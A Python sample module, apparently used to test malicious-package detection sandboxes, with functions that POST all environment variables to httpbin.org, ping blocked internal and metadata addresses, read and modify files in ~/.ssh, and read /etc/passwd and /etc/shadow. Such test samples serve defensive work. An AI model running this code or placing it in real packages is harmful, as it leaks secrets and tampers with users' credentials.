import http.client
import json
import os
import re

# Sends an HTTPS post request and prints out the response.
# Exfiltrates environment variables.
def send_https_post_request(called_from: str, print_logs: bool) -> None:
  host = "www.httpbin.org"
  conn = http.client.HTTPSConnection(host)
  data = {"text": f"Sending data through HTTPS from: {called_from}. Found environment variables: {str(os.environ)}"}
  json_data = json.dumps(data)
  conn.request("POST", "/post", json_data, headers={"Host": host})
  response = conn.getresponse()
  if print_logs:
    print(response.read().decode())

# Attempts to ping a subset of addresses that packages should not be able to
# ping. Checks if those addresses will send a packet back.
def connect_to_blocked_addresses(called_from: str, print_logs: bool) -> None:
  blocked_addresses = ["172.16.16.1", "169.254.169.254", "10.0.0.1",
                       "172.16.0.1", "192.168.0.1"]
  successful_pings = []
  for ip in blocked_addresses:
    response = os.popen("ping -w 2 " + ip).read()
    packets_received = re.search(", (\d+) received,", response).group(1)
    if packets_received != "0":
      successful_pings.append(ip)
  if print_logs:
    print(f"Called from: {called_from}")
  if len(successful_pings) == 0:
    print("No blocked addresses pinged successfully.")
  else:
    print(
        "Successfully pinged the following addresses that should be blocked: ",
        successful_pings)


# Access ssh keys and attempts to read and write to them.
def access_ssh_keys(called_from: str, print_logs: bool) -> None:
    ssh_keys_directory_path = os.path.join(os.path.expanduser('~'), ".ssh")
    if os.path.isdir(ssh_keys_directory_path):
      try:
        files_in_ssh_keys_directory = os.listdir(ssh_keys_directory_path)
        for file_name in files_in_ssh_keys_directory:
          full_file_path = os.path.join(ssh_keys_directory_path, file_name)
          original_file_data = ""
          with open(full_file_path, "r") as f:
            original_file_data += f.read()
          with open(full_file_path, "a") as f:
            f.write("\nWriting to files in ~/.ssh from: " + called_from)
          # Reset the original state of the files.
          with open(full_file_path, "w") as f:
            f.write(original_file_data)
        if print_logs:
          print("Files in ssh keys directory", files_in_ssh_keys_directory)
      except Exception as e:
        # Fail gracefully to allow execution to continue.
        if print_logs:
          print(f"An exception occurred when calling access_ssh_keys: {str(e)}")
    elif print_logs:
      print("Could not locate ssh key directory.")

def read_file_and_log(file_to_read: str, called_from: str, print_logs: bool) -> None:
  if os.path.isfile(file_to_read):
    try:
      with open(file_to_read, "r") as f:
        file_lines = f.readlines()
        if print_logs:
          print("Read " + file_to_read + " from: " + called_from + ". Lines: " + str(len(file_lines)))
    except Exception as e:
      # Fail gracefully to allow execution to continue.
      if print_logs:
        print(f"An exception occurred when calling read_file_and_log: {str(e)}")

def access_passwords(called_from: str, print_logs: bool) -> None:
  password_file = os.path.join(os.path.abspath(os.sep), "etc", "passwd")
  shadow_password_file = os.path.join(os.path.abspath(os.sep), "etc", "shadow")
  read_file_and_log(password_file, called_from, print_logs)
  # Requires root to read.
  read_file_and_log(shadow_password_file, called_from, print_logs)

# Collection of functionalities to run that can be customized. Pick relevant ones and then rebuild the package.
# Notes: connect_to_blocked_addresses is slow because it will wait for ping responses.
network_functions = [send_https_post_request, connect_to_blocked_addresses]
access_credentials_functions = [access_ssh_keys, access_passwords]

def main():
  [f("main function", True) for f in network_functions + access_credentials_functions]

if __name__ == "__main__":
  main()
